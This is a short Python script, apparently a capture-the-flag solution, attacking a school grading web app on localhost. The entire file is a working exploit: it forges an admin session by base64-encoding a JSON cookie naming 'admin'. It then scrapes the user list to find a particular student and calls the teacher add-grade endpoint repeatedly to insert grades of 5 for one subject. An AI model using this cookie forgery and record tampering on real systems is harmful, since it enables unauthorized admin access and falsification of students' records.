#!/usr/bin/env python3
import requests
import base64
import json

# html parser
from bs4 import BeautifulSoup

url = "http://localhost:8000"
# Get the flag
cookie = {
    "username":"admin"
}
student_username = "JakaNovak"
fix_grade = "Slovenščina"

cookie = base64.b64encode(json.dumps(cookie).encode()).decode()

r = requests.get(url, cookies={"user":cookie})

print(r.text)

soup = BeautifulSoup(r.text, "html.parser")

users = soup.find("table")

# get all users
users = users.find_all("tr")

# find user link
for user in users:
    a_tag = user.find("a")
    if not a_tag:
        continue
    if a_tag.text.strip() == student_username:
        user_link = a_tag["href"]
        break

if not user_link:
    print("User not found")
    exit(1)

student_id = user_link.split("=")[1]

# get user page
r = requests.get(url + user_link, cookies={"user":cookie})
print(r.text)

userpage_text = r.text

# find h3 with text fix_grade
soup = BeautifulSoup(r.text, "html.parser")
h4 = soup.find("h4", text=fix_grade)

if not h4:
    print("h4 not found")
    exit(1)
# find table after h4
table = h4.find_next_sibling("table")

print(h4, table)
# find all links in all li
links = table.find_all("a")

# visit all links
for link in links:
    r = requests.get(url + link["href"], cookies={"user":cookie})
    print(r.text)


# find select id subject_id
soup = BeautifulSoup(userpage_text, "html.parser")
select = soup.find("select", {"id":"subject_id"})
options = select.find_all("option")

# find option with value fix_grade
for option in options:
    if option.text.strip() == fix_grade:
        option_value = option["value"]
        break

if not option_value:
    print("option value not found")
    exit(1)


for n in range(len(links)):
    grade = 5
    r = requests.get(url + "/teacher/add_grade.php?return_to=%2Fadmin%2Fuser.php%3Fid%3D7&student_id=" + student_id + "&subject_id=" + option_value + "&grade=" + str(grade), cookies={"user":cookie})
    print(r.text)